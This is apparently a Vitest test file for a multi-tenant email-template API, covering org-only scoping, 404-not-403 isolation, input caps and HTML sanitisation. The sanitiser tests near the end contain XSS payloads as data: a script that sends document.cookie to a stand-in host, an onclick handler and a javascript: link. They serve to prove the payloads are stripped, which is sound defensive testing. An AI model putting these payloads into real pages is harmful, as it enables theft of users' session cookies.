// Route tests for /api/email/orgs/:orgId/templates — template CRUD (MAI-80 /
// EC-17).
//
// What these exist to protect:
//   - a template is ORG-SHARED, the deliberate inverse of a draft: every query
//     filters on `orgId` ALONE, and a second member of the same org may read,
//     edit, and delete a template they did not write. A test that only proved
//     the cross-org 404 would still pass if someone added `userId` to the where
//     clause by reflex, so the same-org member is pinned here explicitly.
//   - another ORG's template is a 404, never a 403 — a 403 confirms the id
//     names a real row — and the tenant key is asserted on the where clause
//     itself, not just on the status code.
//   - `bodyHtml` goes through the shared allow-list on EVERY write. What is
//     stored is what gets rendered later, in the composer and in a sent email,
//     so the assertion is on what reaches Prisma.
//   - `fieldsJson` is DERIVED. A client-supplied one never reaches the column.
//   - a name is required and capped; subject and body are capped.
//   - deleting a template does not touch drafts made from it.
import { beforeEach, describe, expect, it, vi } from 'vitest'
import request from 'supertest'

// vi.hoisted() builds the mocks, vi.mock() swaps the modules, and `app.js` is
// imported LAST so the mocks are in place when its module graph loads.
const { prismaMock, verifyTokenMock } = vi.hoisted(() => ({
  prismaMock: {
    user: { findUnique: vi.fn() },
    membership: { findFirst: vi.fn() },
    emailTemplate: {
      findMany: vi.fn(),
      findFirst: vi.fn(),
      create: vi.fn(),
      updateMany: vi.fn(),
      deleteMany: vi.fn(),
    },
    // Present so the "deleting a template leaves drafts alone" test can prove
    // nothing on this model was called, rather than trusting that it was not.
    emailDraft: {
      findMany: vi.fn(),
      findFirst: vi.fn(),
      count: vi.fn(),
      create: vi.fn(),
      updateMany: vi.fn(),
      deleteMany: vi.fn(),
    },
  },
  verifyTokenMock: vi.fn(),
}))

vi.mock('../../db.js', () => ({ default: prismaMock }))
vi.mock('../../../dependencies/firebaseAdmin.js', () => ({
  verifyFirebaseIdToken: verifyTokenMock,
  setFirebaseUserDisabled: vi.fn(),
  deleteFirebaseUser: vi.fn(),
  revokeFirebaseRefreshTokens: vi.fn(),
}))

import app from '../../app.js'
import {
  TEMPLATE_BODY_MAX,
  TEMPLATE_LIST_LIMIT,
  TEMPLATE_NAME_MAX,
  TEMPLATE_SUBJECT_MAX,
} from '../email.js'

const NOW = new Date('2026-08-20T12:00:00.000Z')
const AUTH = 'Bearer fake-token'
const ORG_A = 'org-a'
const ORG_B = 'org-b'
const URL_A = `/api/email/orgs/${ORG_A}/templates`
const URL_B = `/api/email/orgs/${ORG_B}/templates`
const TEMPLATE_ID = 'tpl-1'
const ONE_A = `${URL_A}/${TEMPLATE_ID}`
const ONE_B = `${URL_B}/${TEMPLATE_ID}`

function userRow(overrides: Record<string, unknown> = {}) {
  return {
    id: 'user-a',
    firebaseUid: 'uid-a',
    email: 'a@orga.com',
    firstName: 'Al',
    lastName: 'Pha',
    title: null,
    imageUrl: null,
    roles: ['basic'],
    enabled: true,
    timeZone: 'America/New_York',
    currentOrgId: ORG_A,
    createdAt: NOW,
    updatedAt: NOW,
    ...overrides,
  }
}

function membershipRow(overrides: Record<string, unknown> = {}) {
  return {
    id: 'mem-a',
    userId: 'user-a',
    orgId: ORG_A,
    roles: ['basic'],
    isActive: true,
    createdAt: NOW,
    updatedAt: NOW,
    org: { id: ORG_A, name: 'Org A', logo: null, enabled: true, createdAt: NOW, updatedAt: NOW },
    ...overrides,
  }
}

function orgB() {
  return { id: ORG_B, name: 'Org B', logo: null, enabled: true, createdAt: NOW, updatedAt: NOW }
}

function templateRow(overrides: Record<string, unknown> = {}) {
  return {
    id: TEMPLATE_ID,
    orgId: ORG_A,
    createdById: 'user-a',
    name: 'Follow-up after call',
    subject: 'Great speaking with you',
    bodyHtml: '<p>Hi</p>',
    fieldsJson: null,
    createdAt: NOW,
    updatedAt: NOW,
    ...overrides,
  }
}

/** Signs the caller in. `membership` is what they hold in the org they ask about. */
function authAs(membership: ReturnType<typeof membershipRow> | null = membershipRow()): void {
  verifyTokenMock.mockResolvedValue({ uid: 'uid-a', email: 'a@orga.com' })
  prismaMock.user.findUnique.mockResolvedValue(userRow())
  // The gate looks the caller's membership up per request; null means "not a member".
  prismaMock.membership.findFirst.mockResolvedValue(membership)
}

beforeEach(() => {
  vi.clearAllMocks()
  authAs()
  prismaMock.emailTemplate.findMany.mockResolvedValue([])
  prismaMock.emailTemplate.create.mockImplementation(
    async ({ data }: { data: Record<string, unknown> }) => templateRow(data),
  )
  // The row exists in the org the caller asked about unless a test says otherwise.
  prismaMock.emailTemplate.updateMany.mockResolvedValue({ count: 1 })
  prismaMock.emailTemplate.deleteMany.mockResolvedValue({ count: 1 })
  prismaMock.emailTemplate.findFirst.mockResolvedValue(templateRow())
})

// ============================================================
// GET
// ============================================================
describe('GET /api/email/orgs/:orgId/templates', () => {
  it('returns this org’s templates keyed, with a total', async () => {
    prismaMock.emailTemplate.findMany.mockResolvedValue([
      templateRow({ id: 'tpl-a', name: 'Apology' }),
      templateRow({ id: 'tpl-b', name: 'Booking' }),
    ])

    const res = await request(app).get(URL_A).set('Authorization', AUTH)

    expect(res.status).toBe(200)
    expect(res.body.total).toBe(2)
    expect(res.body.templates.map((t: { name: string }) => t.name)).toEqual(['Apology', 'Booking'])
  })

  it('reads on orgId ALONE, alphabetically, capped', async () => {
    await request(app).get(URL_A).set('Authorization', AUTH)

    const args = prismaMock.emailTemplate.findMany.mock.calls[0][0]
    expect(args.where).toEqual({ orgId: ORG_A })
    // The point of the test: a template is org-shared, so the author is NOT a
    // filter. If someone copies the draft's scoping down by reflex, this fails.
    expect(args.where).not.toHaveProperty('userId')
    expect(args.where).not.toHaveProperty('createdById')
    expect(args.orderBy).toEqual([{ name: 'asc' }, { id: 'asc' }])
    expect(args.take).toBe(TEMPLATE_LIST_LIMIT)
  })

  it('hands back a template whose author has left, with a null createdById', async () => {
    // onDelete: SetNull — the template outlives the rep who wrote it. A null
    // author is a fact about the row, not an error, and must not be dropped.
    prismaMock.emailTemplate.findMany.mockResolvedValue([templateRow({ createdById: null })])

    const res = await request(app).get(URL_A).set('Authorization', AUTH)

    expect(res.status).toBe(200)
    expect(res.body.templates[0].createdById).toBeNull()
  })

  it('rejects an unauthenticated caller', async () => {
    const res = await request(app).get(URL_A)

    expect(res.status).toBe(401)
  })
})

// ============================================================
// POST
// ============================================================
describe('POST /api/email/orgs/:orgId/templates', () => {
  it('creates one and returns it keyed, 201', async () => {
    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ name: 'Follow-up', subject: 'Hello', bodyHtml: '<p>Hi</p>' })

    expect(res.status).toBe(201)
    expect(res.body.template.name).toBe('Follow-up')
    expect(res.body.template.subject).toBe('Hello')
  })

  it('takes orgId from the path and createdById from the verified caller', async () => {
    await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      // A caller who tries to plant the row in another org, under another name.
      .send({ name: 'Follow-up', orgId: ORG_B, createdById: 'user-zzz' })

    const { data } = prismaMock.emailTemplate.create.mock.calls[0][0]
    expect(data.orgId).toBe(ORG_A)
    expect(data.createdById).toBe('user-a')
  })

  it('requires a name', async () => {
    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ subject: 'Hello', bodyHtml: '<p>Hi</p>' })

    expect(res.status).toBe(400)
    expect(res.body.error).toBe('A template needs a name.')
    expect(prismaMock.emailTemplate.create).not.toHaveBeenCalled()
  })

  it('refuses a name that is only whitespace', async () => {
    const res = await request(app).post(URL_A).set('Authorization', AUTH).send({ name: '   ' })

    expect(res.status).toBe(400)
    expect(res.body.error).toBe('A template needs a name.')
  })

  it('caps the name', async () => {
    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ name: 'x'.repeat(TEMPLATE_NAME_MAX + 1) })

    expect(res.status).toBe(400)
    expect(res.body.error).toContain(String(TEMPLATE_NAME_MAX))
  })

  it('caps the subject', async () => {
    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ name: 'Follow-up', subject: 'x'.repeat(TEMPLATE_SUBJECT_MAX + 1) })

    expect(res.status).toBe(400)
    expect(res.body.error).toContain(String(TEMPLATE_SUBJECT_MAX))
  })

  it('caps the body', async () => {
    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ name: 'Follow-up', bodyHtml: 'x'.repeat(TEMPLATE_BODY_MAX + 1) })

    expect(res.status).toBe(400)
    expect(res.body.error).toContain(String(TEMPLATE_BODY_MAX))
  })

  it('stores empty strings, never null, when subject and body are left out', async () => {
    // Both columns are non-nullable: a rep saving a shell to fill in later is
    // not an error, but it is an empty string and not a null.
    await request(app).post(URL_A).set('Authorization', AUTH).send({ name: 'Shell' })

    const { data } = prismaMock.emailTemplate.create.mock.calls[0][0]
    expect(data.subject).toBe('')
    expect(data.bodyHtml).toBe('')
  })

  it('ignores a client-supplied fieldsJson — it is derived server-side only', async () => {
    await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ name: 'Follow-up', fieldsJson: ['first_name', 'company'] })

    const { data } = prismaMock.emailTemplate.create.mock.calls[0][0]
    expect(data).not.toHaveProperty('fieldsJson')
  })
})

// ============================================================
// PATCH
// ============================================================
describe('PATCH /api/email/orgs/:orgId/templates/:templateId', () => {
  it('saves the named fields and returns the stored row', async () => {
    prismaMock.emailTemplate.findFirst.mockResolvedValue(templateRow({ name: 'Renamed' }))

    const res = await request(app)
      .patch(ONE_A)
      .set('Authorization', AUTH)
      .send({ name: 'Renamed' })

    expect(res.status).toBe(200)
    expect(res.body.template.name).toBe('Renamed')
    expect(prismaMock.emailTemplate.updateMany.mock.calls[0][0].data).toEqual({ name: 'Renamed' })
  })

  it('writes ONLY the keys the body carried', async () => {
    // Renaming a template must not blank its body.
    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ name: 'Renamed' })

    const { data } = prismaMock.emailTemplate.updateMany.mock.calls[0][0]
    expect(data).not.toHaveProperty('subject')
    expect(data).not.toHaveProperty('bodyHtml')
  })

  it('scopes the write to orgId ALONE — never to the author', async () => {
    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ name: 'Renamed' })

    const { where } = prismaMock.emailTemplate.updateMany.mock.calls[0][0]
    expect(where).toEqual({ id: TEMPLATE_ID, orgId: ORG_A })
    expect(where).not.toHaveProperty('createdById')
  })

  it('refuses an empty patch rather than bumping updatedAt for nothing', async () => {
    const res = await request(app).patch(ONE_A).set('Authorization', AUTH).send({})

    expect(res.status).toBe(400)
    expect(res.body.error).toBe('Name a field to save.')
    expect(prismaMock.emailTemplate.updateMany).not.toHaveBeenCalled()
  })

  it('refuses a blank name on edit — a template stays pickable', async () => {
    const res = await request(app).patch(ONE_A).set('Authorization', AUTH).send({ name: '' })

    expect(res.status).toBe(400)
    expect(res.body.error).toBe('A template needs a name.')
  })

  it('ignores a client-supplied fieldsJson on edit too', async () => {
    await request(app)
      .patch(ONE_A)
      .set('Authorization', AUTH)
      .send({ name: 'Renamed', fieldsJson: ['first_name'] })

    expect(prismaMock.emailTemplate.updateMany.mock.calls[0][0].data).not.toHaveProperty(
      'fieldsJson',
    )
  })
})

// ============================================================
// DELETE
// ============================================================
describe('DELETE /api/email/orgs/:orgId/templates/:templateId', () => {
  it('removes it and hands the id back', async () => {
    const res = await request(app).delete(ONE_A).set('Authorization', AUTH)

    expect(res.status).toBe(200)
    expect(res.body.template).toEqual({ id: TEMPLATE_ID })
    expect(prismaMock.emailTemplate.deleteMany.mock.calls[0][0].where).toEqual({
      id: TEMPLATE_ID,
      orgId: ORG_A,
    })
  })

  it('never touches drafts made from it', async () => {
    // A template is copied into a card at pick time; there is no link back, so
    // deleting one must not reach the draft table at all.
    await request(app).delete(ONE_A).set('Authorization', AUTH)

    expect(prismaMock.emailDraft.deleteMany).not.toHaveBeenCalled()
    expect(prismaMock.emailDraft.updateMany).not.toHaveBeenCalled()
  })

  it('an id that matches nothing is a 404', async () => {
    prismaMock.emailTemplate.deleteMany.mockResolvedValue({ count: 0 })

    const res = await request(app).delete(ONE_A).set('Authorization', AUTH)

    expect(res.status).toBe(404)
    expect(res.body.error).toBe('Template not found')
  })
})

// ============================================================
// A template is ORG-SHARED — any member, but only this org
// ============================================================
describe('a template belongs to the org, not to its author', () => {
  it('GET: a second member of the same org sees a template they did not write', async () => {
    authAs(membershipRow({ id: 'mem-b', userId: 'user-a' }))
    prismaMock.emailTemplate.findMany.mockResolvedValue([templateRow({ createdById: 'user-b' })])

    const res = await request(app).get(URL_A).set('Authorization', AUTH)

    expect(res.status).toBe(200)
    expect(res.body.templates).toHaveLength(1)
    expect(res.body.templates[0].createdById).toBe('user-b')
  })

  it('PATCH: a member may edit a template someone else wrote', async () => {
    prismaMock.emailTemplate.findFirst.mockResolvedValue(templateRow({ createdById: 'user-b' }))

    const res = await request(app).patch(ONE_A).set('Authorization', AUTH).send({ name: 'Renamed' })

    expect(res.status).toBe(200)
  })

  it('DELETE: a member may delete a template someone else wrote', async () => {
    const res = await request(app).delete(ONE_A).set('Authorization', AUTH)

    expect(res.status).toBe(200)
  })
})

// ============================================================
// Org isolation — 404, never 403
// ============================================================
// 404 on purpose: telling a caller the org is real but off-limits leaks that it
// exists. The same answer covers "no such org", "not a member", and "member of
// a different org", so the three cannot be told apart.
describe('another org’s templates are a 404, never a 403', () => {
  it('GET: a non-member gets a 404 and no query runs', async () => {
    authAs(null)

    const res = await request(app).get(URL_B).set('Authorization', AUTH)

    expect(res.status).toBe(404)
    expect(res.body.error).toBe('Organization not found')
    expect(prismaMock.emailTemplate.findMany).not.toHaveBeenCalled()
  })

  it('POST: a non-member gets a 404 and writes nothing', async () => {
    authAs(null)

    const res = await request(app)
      .post(URL_B)
      .set('Authorization', AUTH)
      .send({ name: 'Follow-up' })

    expect(res.status).toBe(404)
    expect(prismaMock.emailTemplate.create).not.toHaveBeenCalled()
  })

  it('PATCH: a non-member gets a 404 and writes nothing', async () => {
    authAs(null)

    const res = await request(app).patch(ONE_B).set('Authorization', AUTH).send({ name: 'Renamed' })

    expect(res.status).toBe(404)
    expect(prismaMock.emailTemplate.updateMany).not.toHaveBeenCalled()
  })

  it('DELETE: a non-member gets a 404 and deletes nothing', async () => {
    authAs(null)

    const res = await request(app).delete(ONE_B).set('Authorization', AUTH)

    expect(res.status).toBe(404)
    expect(prismaMock.emailTemplate.deleteMany).not.toHaveBeenCalled()
  })

  it('PATCH: a real template id under a DIFFERENT org is a 404', async () => {
    // The caller really is a member of ORG_B, so the gate lets them through —
    // the where clause is what stops them reaching ORG_A's row.
    authAs(membershipRow({ orgId: ORG_B, org: orgB() }))
    prismaMock.emailTemplate.updateMany.mockResolvedValue({ count: 0 })

    const res = await request(app).patch(ONE_B).set('Authorization', AUTH).send({ name: 'Renamed' })

    expect(res.status).toBe(404)
    expect(res.body.error).toBe('Template not found')
    expect(prismaMock.emailTemplate.updateMany.mock.calls[0][0].where.orgId).toBe(ORG_B)
  })

  it('DELETE: a real template id under a DIFFERENT org is a 404', async () => {
    authAs(membershipRow({ orgId: ORG_B, org: orgB() }))
    prismaMock.emailTemplate.deleteMany.mockResolvedValue({ count: 0 })

    const res = await request(app).delete(ONE_B).set('Authorization', AUTH)

    expect(res.status).toBe(404)
    expect(prismaMock.emailTemplate.deleteMany.mock.calls[0][0].where.orgId).toBe(ORG_B)
  })

  it('GET: reads the org in the PATH, not the caller’s currentOrgId preference', async () => {
    // currentOrgId says ORG_A; the path says ORG_B, where they are a member.
    // A stale UI preference must never decide which tenant's rows are read.
    authAs(membershipRow({ orgId: ORG_B, org: orgB() }))

    await request(app).get(URL_B).set('Authorization', AUTH)

    expect(prismaMock.emailTemplate.findMany.mock.calls[0][0].where.orgId).toBe(ORG_B)
  })

  it('a deactivated member gets the same 404 as a stranger', async () => {
    // requireMembership filters on isActive, so offboarding takes effect on the
    // removed person's very next request.
    authAs(null)

    const res = await request(app).get(URL_A).set('Authorization', AUTH)

    expect(res.status).toBe(404)
    expect(res.body.error).toBe('Organization not found')
  })
})

// ============================================================
// The sanitiser is WIRED IN
// ============================================================
// `server/src/lib/__tests__/sanitizeHtml.test.ts` proves the allow-list itself
// blocks the attacks. These prove the template write path actually calls it —
// the half that silently regresses, because a sanitiser nothing imports still
// passes all of its own tests. The assertion is on what reaches PRISMA: what is
// stored is what gets rendered later, in the editor and in a sent email.
describe('a template body is sanitised before it is stored', () => {
  it('POST strips a <script> on the way into the database', async () => {
    await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({
        name: 'Follow-up',
        bodyHtml: '<p>Hi Ann</p><script>fetch("//evil.example?c="+document.cookie)</script>',
      })

    expect(prismaMock.emailTemplate.create.mock.calls[0][0].data.bodyHtml).toBe('<p>Hi Ann</p>')
  })

  it('PATCH strips an event handler and a javascript: href, keeping the rep’s words', async () => {
    await request(app)
      .patch(ONE_A)
      .set('Authorization', AUTH)
      .send({
        bodyHtml:
          '<p style="color:red" onclick="alert(1)">Quote</p>' +
          '<a href="javascript:alert(1)">terms</a>',
      })

    const stored = prismaMock.emailTemplate.updateMany.mock.calls[0][0].data.bodyHtml as string
    expect(stored).toBe('<p>Quote</p><a>terms</a>')
    expect(stored.toLowerCase()).not.toContain('javascript')
    expect(stored).not.toContain('onclick')
    expect(stored).not.toContain('style')
  })

  it('leaves formatting the rep is allowed to use byte for byte', async () => {
    const html = '<p>Hi <strong>Ann</strong></p><ul><li><em>one</em></li></ul>'

    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: html })

    expect(prismaMock.emailTemplate.updateMany.mock.calls[0][0].data.bodyHtml).toBe(html)
  })

  it('re-saving what the server already stored changes nothing', async () => {
    const first =
      '<p>Hi <strong>Ann</strong></p><a href="https://acme.example" target="_blank">x</a>'

    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: first })
    const once = prismaMock.emailTemplate.updateMany.mock.calls[0][0].data.bodyHtml as string

    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: once })
    const twice = prismaMock.emailTemplate.updateMany.mock.calls[1][0].data.bodyHtml as string

    expect(twice).toBe(once)
  })
})
